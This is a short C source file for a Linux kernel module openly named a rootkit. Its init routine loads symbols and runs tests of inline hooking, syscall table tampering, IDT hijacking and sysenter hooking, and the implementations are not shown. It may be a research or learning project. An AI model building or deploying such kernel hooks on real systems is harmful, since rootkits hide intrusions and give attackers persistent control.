#include "log.h"
#include "symbol.h"
#include "../tests/tests.h"

#include <linux/module.h>
#include <linux/kernel.h>

static int __init rootkit_init_module(void)
{
    /* Init rootkit */
    init_symbols();

    /* Run some tests */
    test_inline_hooking();
    test_hook();
    test_syscall_tbl();
    test_idt_hijacking();
    test_sysenter();

    return 0;
}

static void __exit rootkit_cleanup_module(void)
{
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
MODULE_LICENSE("GPL");
